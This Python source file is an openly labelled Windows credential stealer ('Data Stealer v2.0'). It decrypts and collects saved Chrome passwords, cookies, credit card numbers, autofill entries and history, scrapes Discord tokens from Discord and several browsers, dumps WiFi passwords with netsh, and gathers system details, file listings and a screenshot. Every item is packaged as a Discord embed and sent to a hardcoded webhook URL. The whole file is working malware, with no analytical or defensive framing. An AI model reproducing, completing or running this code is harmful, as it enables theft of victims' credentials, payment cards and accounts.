import base64
import json
import os
import re
import sqlite3
import shutil
import subprocess
import sys
import tempfile
import urllib.request
import zipfile
from pathlib import Path
from datetime import datetime
import platform
import socket
import uuid
import psutil
import win32crypt
from Crypto.Cipher import AES

WEBHOOK_URL = "https://discord.com/api/webhooks/1472160992686510253/6H0azJoQTLYi2hlIQEor-dLWRZr5HdIDfREHJy5A83n8Hu-BWfmlKxBWy7hDhPvBtlSq"

TOKEN_REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

class DataStealer:
    def __init__(self):
        self.webhook_url = WEBHOOK_URL
        self.local_app_data = os.getenv("LOCALAPPDATA")
        self.app_data = os.getenv("APPDATA")
        self.user_profile = os.getenv("USERPROFILE")
        self.temp_dir = tempfile.mkdtemp()
        self.collected_data = {
            "system": {},
            "tokens": {},
            "passwords": {},
            "cookies": {},
            "autofill": {},
            "credit_cards": {},
            "history": {},
            "bookmarks": {},
            "downloads": {},
            "wifi": {},
            "files": {},
            "screenshots": [],
            "processes": [],
            "network": {},
        }
    
    def send_webhook(self, embeds):
        try:
            data = {"embeds": embeds}
            request = urllib.request.Request(
                self.webhook_url,
                data=json.dumps(data).encode(),
                headers=REQUEST_HEADERS
            )
            with urllib.request.urlopen(request, timeout=10) as response:
                return response.status == 204
        except Exception as e:
            print(f"Webhook error: {e}")
            return False
    
    def get_system_info(self):
        try:
            self.collected_data["system"] = {
                "hostname": socket.gethostname(),
                "username": os.getlogin(),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]),
                "ip_address": self.get_public_ip(),
                "disk_usage": self.get_disk_usage(),
                "cpu_count": psutil.cpu_count(),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            }
        except Exception as e:
            print(f"System info error: {e}")
    
    def get_public_ip(self):
        try:
            response = urllib.request.urlopen('https://api.ipify.org', timeout=5)
            return response.read().decode('utf-8')
        except:
            return "Unknown"
    
    def get_disk_usage(self):
        try:
            usage = psutil.disk_usage('/')
            return f"{round(usage.used / (1024**3), 2)} GB / {round(usage.total / (1024**3), 2)} GB"
        except:
            return "Unknown"
    
    def get_chrome_encryption_key(self):
        try:
            local_state_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Local State"
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Chrome key error: {e}")
            return None
    
    def decrypt_chrome_data(self, data, key):
        try:
            iv = data[3:15]
            payload = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    
    def get_chrome_passwords(self):
        try:
            key = self.get_chrome_encryption_key()
            if not key:
                return
            
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            temp_db = Path(self.temp_dir) / "LoginData"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if username and encrypted_password:
                    password = self.decrypt_chrome_data(encrypted_password, key)
                    if url not in self.collected_data["passwords"]:
                        self.collected_data["passwords"][url] = []
                    self.collected_data["passwords"][url].append({
                        "username": username,
                        "password": password
                    })
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome passwords error: {e}")
    
    def get_chrome_cookies(self):
        try:
            key = self.get_chrome_encryption_key()
            if not key:
                return
            
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Network" / "Cookies"
            temp_db = Path(self.temp_dir) / "Cookies"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            for row in cursor.fetchall():
                host, name, encrypted_value = row
                if encrypted_value:
                    value = self.decrypt_chrome_data(encrypted_value, key)
                    if host not in self.collected_data["cookies"]:
                        self.collected_data["cookies"][host] = {}
                    self.collected_data["cookies"][host][name] = value
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome cookies error: {e}")
    
    def get_chrome_history(self):
        try:
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "History"
            temp_db = Path(self.temp_dir) / "History"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            
            self.collected_data["history"] = []
            for row in cursor.fetchall():
                self.collected_data["history"].append({
                    "url": row[0],
                    "title": row[1],
                    "visit_count": row[2],
                })
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome history error: {e}")
    
    def get_chrome_credit_cards(self):
        try:
            key = self.get_chrome_encryption_key()
            if not key:
                return
            
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Web Data"
            temp_db = Path(self.temp_dir) / "WebData"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            
            for row in cursor.fetchall():
                name, month, year, encrypted_card = row
                if encrypted_card:
                    card_number = self.decrypt_chrome_data(encrypted_card, key)
                    self.collected_data["credit_cards"][name] = {
                        "number": card_number,
                        "expiry": f"{month}/{year}"
                    }
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome credit cards error: {e}")
    
    def get_chrome_autofill(self):
        try:
            db_path = Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Web Data"
            temp_db = Path(self.temp_dir) / "WebData2"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM autofill")
            
            for row in cursor.fetchall():
                name, value = row
                self.collected_data["autofill"][name] = value
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"Chrome autofill error: {e}")
    
    def get_discord_tokens(self):
        try:
            discord_paths = [
                Path(self.app_data) / "discord" / "Local Storage" / "leveldb",
                Path(self.app_data) / "discordcanary" / "Local Storage" / "leveldb",
                Path(self.app_data) / "discordptb" / "Local Storage" / "leveldb",
                Path(self.local_app_data) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(self.app_data) / "Opera Software" / "Opera Stable" / "Local Storage" / "leveldb",
                Path(self.local_app_data) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
                Path(self.app_data) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
            ]
            
            for path in discord_paths:
                if not path.exists():
                    continue
                
                for file in path.iterdir():
                    if not file.is_file():
                        continue
                    
                    try:
                        content = file.read_text(encoding='utf-8', errors='ignore')
                        tokens = re.findall(TOKEN_REGEX, content)
                        
                        for token in tokens:
                            user_id = self.get_user_id_from_token(token)
                            if user_id:
                                if user_id not in self.collected_data["tokens"]:
                                    self.collected_data["tokens"][user_id] = {
                                        "tokens": set(),
                                        "source": str(path)
                                    }
                                self.collected_data["tokens"][user_id]["tokens"].add(token)
                    except:
                        continue
        except Exception as e:
            print(f"Discord tokens error: {e}")
    
    def get_user_id_from_token(self, token):
        try:
            user_id = base64.b64decode(token.split(".", maxsplit=1)[0] + "==").decode("utf-8")
            return user_id
        except:
            return None
    
    def get_wifi_passwords(self):
        try:
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, text=True)
            profiles = re.findall(r'All User Profile\s*:\s*(.*)', result)
            
            for profile in profiles:
                profile = profile.strip()
                try:
                    password_result = subprocess.check_output(
                        f'netsh wlan show profile "{profile}" key=clear',
                        shell=True,
                        text=True
                    )
                    password_match = re.search(r'Key Content\s*:\s*(.*)', password_result)
                    if password_match:
                        self.collected_data["wifi"][profile] = password_match.group(1).strip()
                except:
                    continue
        except Exception as e:
            print(f"WiFi passwords error: {e}")
    
    def get_processes(self):
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    self.collected_data["processes"].append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "username": proc.info['username']
                    })
                except:
                    continue
        except Exception as e:
            print(f"Process list error: {e}")
    
    def get_network_info(self):
        try:
            addrs = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            
            for interface, addr_list in addrs.items():
                self.collected_data["network"][interface] = {
                    "addresses": [],
                    "status": "up" if stats[interface].isup else "down"
                }
                for addr in addr_list:
                    self.collected_data["network"][interface]["addresses"].append({
                        "family": str(addr.family),
                        "address": addr.address
                    })
        except Exception as e:
            print(f"Network info error: {e}")
    
    def search_interesting_files(self):
        try:
            extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.png', '.jpg', '.jpeg']
            search_dirs = [
                Path(self.user_profile) / "Desktop",
                Path(self.user_profile) / "Documents",
                Path(self.user_profile) / "Downloads",
            ]
            
            for directory in search_dirs:
                if not directory.exists():
                    continue
                
                for ext in extensions:
                    for file in directory.rglob(f'*{ext}'):
                        try:
                            if file.stat().st_size < 10 * 1024 * 1024:
                                self.collected_data["files"][str(file)] = {
                                    "size": file.stat().st_size,
                                    "modified": datetime.fromtimestamp(file.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                                }
                        except:
                            continue
        except Exception as e:
            print(f"File search error: {e}")
    
    def take_screenshot(self):
        try:
            import pyautogui
            screenshot_path = Path(self.temp_dir) / "screenshot.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            self.collected_data["screenshots"].append(str(screenshot_path))
        except Exception as e:
            print(f"Screenshot error: {e}")
    
    def collect_all_data(self):
        print("[*] Collecting system information...")
        self.get_system_info()
        
        print("[*] Extracting Chrome passwords...")
        self.get_chrome_passwords()
        
        print("[*] Extracting Chrome cookies...")
        self.get_chrome_cookies()
        
        print("[*] Extracting Chrome history...")
        self.get_chrome_history()
        
        print("[*] Extracting Chrome credit cards...")
        self.get_chrome_credit_cards()
        
        print("[*] Extracting Chrome autofill...")
        self.get_chrome_autofill()
        
        print("[*] Extracting Discord tokens...")
        self.get_discord_tokens()
        
        print("[*] Extracting WiFi passwords...")
        self.get_wifi_passwords()
        
        print("[*] Collecting process list...")
        self.get_processes()
        
        print("[*] Collecting network information...")
        self.get_network_info()
        
        print("[*] Searching for interesting files...")
        self.search_interesting_files()
        
        print("[*] Taking screenshot...")
        self.take_screenshot()
    
    def create_embeds(self):
        embeds = []
        
        system_embed = {
            "title": "🖥️ System Information",
            "color": 0x000000,
            "fields": [
                {"name": "Hostname", "value": f"`{self.collected_data['system'].get('hostname', 'N/A')}`", "inline": True},
                {"name": "Username", "value": f"`{self.collected_data['system'].get('username', 'N/A')}`", "inline": True},
                {"name": "IP Address", "value": f"`{self.collected_data['system'].get('ip_address', 'N/A')}`", "inline": True},
                {"name": "Platform", "value": f"`{self.collected_data['system'].get('platform', 'N/A')} {self.collected_data['system'].get('platform_release', '')}`", "inline": True},
                {"name": "RAM", "value": f"`{self.collected_data['system'].get('ram', 'N/A')}`", "inline": True},
                {"name": "Disk", "value": f"`{self.collected_data['system'].get('disk_usage', 'N/A')}`", "inline": True},
                {"name": "MAC Address", "value": f"`{self.collected_data['system'].get('mac_address', 'N/A')}`", "inline": True},
                {"name": "CPU", "value": f"`{self.collected_data['system'].get('cpu_count', 'N/A')} cores`", "inline": True},
                {"name": "Boot Time", "value": f"`{self.collected_data['system'].get('boot_time', 'N/A')}`", "inline": True},
            ],
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {"text": "Data Stealer v2.0"}
        }
        embeds.append(system_embed)
        
        if self.collected_data["tokens"]:
            for user_id, data in list(self.collected_data["tokens"].items())[:3]:
                token_embed = {
                    "title": f"🔑 Discord Token - {user_id}",
                    "color": 0xFF0000,
                    "fields": []
                }
                
                for token in list(data["tokens"])[:3]:
                    token_embed["fields"].append({
                        "name": "Token",
                        "value": f"```{token}```",
                        "inline": False
                    })
                
                token_embed["fields"].append({
                    "name": "Source",
                    "value": f"`{data['source']}`",
                    "inline": False
                })
                
                embeds.append(token_embed)
        
        if self.collected_data["passwords"]:
            password_embed = {
                "title": "🔐 Saved Passwords",
                "color": 0x000000,
                "description": f"Total: {len(self.collected_data['passwords'])} sites",
                "fields": []
            }
            
            for url, creds in list(self.collected_data["passwords"].items())[:10]:
                cred_text = "\n".join([f"User: `{c['username']}`\nPass: `{c['password']}`" for c in creds])
                password_embed["fields"].append({
                    "name": url[:100],
                    "value": cred_text[:1024],
                    "inline": False
                })
            
            embeds.append(password_embed)
        
        if self.collected_data["credit_cards"]:
            cc_embed = {
                "title": "💳 Credit Cards",
                "color": 0xFF0000,
                "fields": []
            }
            
            for name, data in self.collected_data["credit_cards"].items():
                cc_embed["fields"].append({
                    "name": name,
                    "value": f"Number: `{data['number']}`\nExpiry: `{data['expiry']}`",
                    "inline": False
                })
            
            embeds.append(cc_embed)
        
        if self.collected_data["cookies"]:
            cookie_embed = {
                "title": "🍪 Cookies",
                "color": 0x000000,
                "description": f"Total: {sum(len(v) for v in self.collected_data['cookies'].values())} cookies from {len(self.collected_data['cookies'])} sites",
                "fields": []
            }
            
            for host, cookies in list(self.collected_data["cookies"].items())[:5]:
                cookie_text = "\n".join([f"{k}: {v[:50]}" for k, v in list(cookies.items())[:5]])
                cookie_embed["fields"].append({
                    "name": host[:100],
                    "value": f"```{cookie_text[:1000]}```",
                    "inline": False
                })
            
            embeds.append(cookie_embed)
        
        if self.collected_data["wifi"]:
            wifi_embed = {
                "title": "📶 WiFi Passwords",
                "color": 0x000000,
                "fields": []
            }
            
            for ssid, password in list(self.collected_data["wifi"].items())[:15]:
                wifi_embed["fields"].append({
                    "name": ssid,
                    "value": f"`{password}`",
                    "inline": True
                })
            
            embeds.append(wifi_embed)
        
        if self.collected_data["history"]:
            history_embed = {
                "title": "🌐 Browser History",
                "color": 0x000000,
                "description": f"Last 100 visited sites",
                "fields": []
            }
            
            history_text = "\n".join([f"{h['url'][:100]}" for h in self.collected_data["history"][:30]])
            history_embed["fields"].append({
                "name": "Recent URLs",
                "value": f"```{history_text[:4000]}```",
                "inline": False
            })
            
            embeds.append(history_embed)
        
        if self.collected_data["files"]:
            files_embed = {
                "title": "📁 Interesting Files",
                "color": 0x000000,
                "description": f"Found {len(self.collected_data['files'])} files",
                "fields": []
            }
            
            files_text = "\n".join([f"{k}" for k in list(self.collected_data["files"].keys())[:30]])
            files_embed["fields"].append({
                "name": "File Paths",
                "value": f"```{files_text[:4000]}```",
                "inline": False
            })
            
            embeds.append(files_embed)
        
        return embeds[:10]
    
    def send_data(self):
        print("[*] Creating embeds...")
        embeds = self.create_embeds()
        
        print("[*] Sending to webhook...")
        success = self.send_webhook(embeds)
        
        if success:
            print("[✓] Data sent successfully!")
        else:
            print("[✗] Failed to send data")
        
        try:
            with open(Path(self.temp_dir) / "stolen_data.json", "w") as f:
                json.dump({k: v for k, v in self.collected_data.items() if k != "tokens"}, f, indent=2, default=str)
        except:
            pass
    
    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass
    
    def run(self):
        try:
            print("[*] Starting data collection...")
            self.collect_all_data()
            self.send_data()
            print("[*] Collection complete!")
        except Exception as e:
            print(f"[✗] Error: {e}")
        finally:
            self.cleanup()


def main():
    stealer = DataStealer()
    stealer.run()


if __name__ == "__main__":
    main()
